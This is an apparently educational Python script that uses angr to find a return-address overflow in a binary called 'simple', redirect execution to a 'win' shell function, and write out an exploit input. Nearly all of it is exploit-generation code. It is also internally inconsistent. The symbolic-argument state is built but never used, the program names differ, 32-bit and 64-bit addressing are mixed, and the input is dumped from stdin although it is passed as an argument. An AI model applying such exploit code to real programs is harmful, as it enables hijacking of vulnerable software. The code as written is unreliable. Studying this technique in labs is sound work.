import angr, claripy

# load the binary
project = angr.Project("simple", load_options={ 'auto_load_libs': False })

cfg = project.analyses.CFG()

# Make a simple security checker that checks for an overflow into the return address. There are several cases:
#
# 1. The return address is unchanged and pointing to an internal angr hook (i.e., __libc_start_main)
# 2. The return address is unchanged and pointing inside the program (normal case)
# 3. The return address has been overflowed, and we can point it outside of the program (we'll check for this)
# 4. The return address has been partially overflowed, and still points inside the program (future work)
def state_vuln_filter(state):
    # get the saved instruction pointer from the stack
    saved_eip = state.memory.load(state.regs.ebp + 4, 4, endness="Iend_LE")
    # print("Checking saved EIP:", saved_eip)

    # first, check if the return address points to a hook. If this is intact, then we assume there is no overflow   
    if project.is_hooked(saved_eip):
        return False

    # next, create constraints representing an unsafe condition. In this case,
    # let's check if the return address can point *outside* of the program.
    unsafe_constraints = [ state.solver.Or(saved_eip < project.loader.min_addr, saved_eip > project.loader.max_addr) ]

    # check if the state is satisfiable with these conditions, and return True if it is
    return state.solver.satisfiable(extra_constraints=unsafe_constraints)

# This time, the initialization is a bit different. The application takes a commandline argument, so we must:
# first, create a symbolic bitvector representing the argument.
# We're interested in the last few bytes (the part that will actually overflow the return address), so make it a
# concatination of 60 concrete bytes and 60 symbolic bytes.
arg = claripy.BVV("A"*60).concat(claripy.BVS("arg", 240))
# next, create a state with this argument
state = project.factory.entry_state(args=['overflow3', arg])
# get a new simulation manager from the project factory

simgr = project.factory.simgr()


# initiate a "vuln" stash
simgr.stashes['vuln'] = [ ]


# the starting state has no return address on the stack, so it will trigger our vuln filter.
# We can step it until it no longer triggers the filter before starting the actual analysis.
print("Initializing initial state...")
while simgr.active[0].addr != project.kb.functions['_start'].addr:
    simgr.step()

# Now that we are all set up, let's loop until a vulnerable state has been found
print("Searching for the vulnerability!")
while not simgr.vuln:
    # step the simgr
    simgr.step()
    # after each step, move all states matching our vuln filter from the active stash to the vuln stash
    simgr.move('active', 'vuln', filter_func=state_vuln_filter)




# Now the fun part starts! Let's add a constraint that sets the overflowed return address to the "win" function.
# First, grab the stored return address in the vuln state
print("Constraining saved return address!")
vuln_state = simgr.vuln[0]
overwritten_eip = vuln_state.memory.load(vuln_state.regs.ebp + 4, 4, endness="Iend_LE")
print("Overwritten EIP: ", overwritten_eip)
# Now, let's add a constraint to redirect that return address to the shell function
addr_of_win = project.kb.functions['sub_100003ef0'].addr
vuln_state.add_constraints(overwritten_eip == addr_of_win)

# and now let's explore the vuln stash until we reach the win-function
print("Exploring to 'win' function. This is the 'win' function")
simgr.explore(stash='vuln', find=addr_of_win)


if simgr.found:
    print("found a solution!")
else:
    print("no solution found")

# now synthesize our crashing input
crashing_input = str(simgr.vuln[0].posix.dumps(0))#.state.posix.dumps(0)

open("crashing_input", "w").write(crashing_input)
print("You can crash the program by doing:")
print("# cat crashing_input | ./simple")
